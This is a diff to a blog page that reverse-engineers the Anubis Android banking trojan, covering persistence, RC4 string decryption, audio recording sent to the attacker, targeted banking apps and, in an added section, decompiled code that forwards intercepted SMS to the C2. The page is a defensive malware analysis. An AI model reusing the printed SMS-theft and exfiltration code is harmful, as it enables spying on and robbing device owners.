@@ -231,7 +231,8 @@ up, which helps malware to persist on a device.</p>
         <span style="color:#f92672">&lt;/receiver&gt;</span>
 </code></pre></div><p>The receiver <code>&quot;wocwvy.czyxoxmbauu.slsa.pworotsvjdlioho.hypihteeavv</code> is listening for <code>BOOT_COMPLETED</code>, <code>PACKAGE_ADDED</code>, <code>SMS_RECEIVED</code> and many more stuff. it looks like this one is really important.</p>
 <p>Since we know this is a banking trojan, we assume that application is waiting for the user to
-install banking apps and the above mentioned class is responsible for that.</p>
+install banking apps (PACKAGE_ADDED) and the above mentioned class is responsible for that.</p>
+<p>To achieve persistence it is listening for BOOT_COMPLETED.</p>
 <p>manifest also mentions that the application uses accessibility framework, by class <code>wocwvy.czyxoxmbauu.slsa.egxltnv</code></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml">        <span style="color:#f92672">&lt;service</span> <span style="color:#a6e22e">android:label=</span><span style="color:#e6db74">&#34;Android Security&#34;</span> <span style="color:#a6e22e">android:name=</span><span style="color:#e6db74">&#34;wocwvy.czyxoxmbauu.slsa.egxltnv&#34;</span> <span style="color:#a6e22e">android:permission=</span><span style="color:#e6db74">&#34;android.permission.BIND_ACCESSIBILITY_SERVICE&#34;</span><span style="color:#f92672">&gt;</span>
             <span style="color:#f92672">&lt;intent-filter&gt;</span>
@@ -851,7 +852,8 @@ preference. So my assumption on <code>SomeHttpClass.mo226c</code> being a decode
         <span style="color:#f92672">}</span>
     <span style="color:#f92672">}</span>
 </code></pre></div><p>So it does look like this function is not only a decoder but also a decrypter. Let&rsquo;s take a look at class <code>C0063a</code>.</p>
-<pre tabindex="0"><code>public class C0063a {
+<pre tabindex="0"><code>/* rename this to RC4 */
+public class C0063a {
 
     [... code here]
 
@@ -956,7 +958,10 @@ class <code>C0067b</code> and a string.</p>
         <span style="color:#f92672">}</span>
     <span style="color:#f92672">}</span>
 </code></pre></div><p>inside the try block we see a call to a famililar method, getSharedPreference. In this case key is <code>&quot;url&quot;</code>.
-let&rsquo;s search the xml for the key.</p>
+well if search the xml, you wont find any.</p>
+<p>Now the problem is, how is this thing retrieving value of a shared preference with a non-existing key?</p>
+<p>Probably because malware is generating and writing the url dynamically to the xml.</p>
+<p>Let&rsquo;s analyze the method that makes use of above <strong>php endpoints</strong>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">mo211a</span><span style="color:#f92672">(</span>Context context<span style="color:#f92672">,</span> String str<span style="color:#f92672">,</span> String str2<span style="color:#f92672">,</span> String str3<span style="color:#f92672">)</span> <span style="color:#f92672">{</span> 
         String e <span style="color:#f92672">=</span> getSharedPreference<span style="color:#f92672">(</span>context<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;websocket&#34;</span><span style="color:#f92672">);</span>
         StringBuilder sb <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> StringBuilder<span style="color:#f92672">();</span>
@@ -1142,6 +1147,7 @@ we see another call <code>SomeHttpClass.mo213a</code> but this time with <code>&
     <span style="color:#f92672">}</span>
 </code></pre></div><p>this is the block that actually starts the thread :).
 Soo what this method actually does is, it starts recording audio on the given source, waits until <code>i</code> amount of time and stops recording. then it calls our <code>SomeHttpClass.SendFileToEndpoint</code> method to send it to an endpoint so attacker can recieve the file.</p>
+<h3 id="banking-apps">Banking Apps<a href="#banking-apps" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
 <p>Lets get an idea of how this malware gets banking applications.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#75715e">/* renamed from: wocwvy.czyxoxmbauu.slsa.a */</span>
 <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">BankingApps</span> <span style="color:#f92672">{</span>
@@ -1221,7 +1227,16 @@ Soo what this method actually does is, it starts recording audio on the given so
 - com.ebay.mobile
 </code></pre>
 <p>if it does, it replaces the name with an empty string and append the name to the end of <code>str</code>.</p>
-
+<p>here is the list of applications that anubis targets.</p>
+<h3 id="sms-sending-recieving-and-spamming">SMS Sending, Recieving and Spamming<a href="#sms-sending-recieving-and-spamming" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Some methods in <code>SomeHttpClass</code> is responsible for reading, intercepting and spamming SMS messages.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">ReadSMS</span><span style="color:#f92672">(</span>Context context<span style="color:#f92672">,</span> String str<span style="color:#f92672">,</span> String str2<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+        StringBuilder sb <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> StringBuilder<span style="color:#f92672">();</span>
+        sb<span style="color:#f92672">.</span><span style="color:#a6e22e">append</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;p=&#34;</span><span style="color:#f92672">);</span>
+        sb<span style="color:#f92672">.</span><span style="color:#a6e22e">append</span><span style="color:#f92672">(</span>mo225c<span style="color:#f92672">(</span>mo247q<span style="color:#f92672">(</span>context<span style="color:#f92672">)</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;|Incoming SMS&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;Number: &#34;</span> <span style="color:#f92672">+</span> str <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;Text: &#34;</span> <span style="color:#f92672">+</span> str2 <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;|&#34;</span><span style="color:#f92672">));</span>
+        mo218b<span style="color:#f92672">(</span>context<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;4&#34;</span><span style="color:#f92672">,</span> sb<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">());</span>
+    <span style="color:#f92672">}</span>
+</code></pre></div>
       </div></div>
 
   
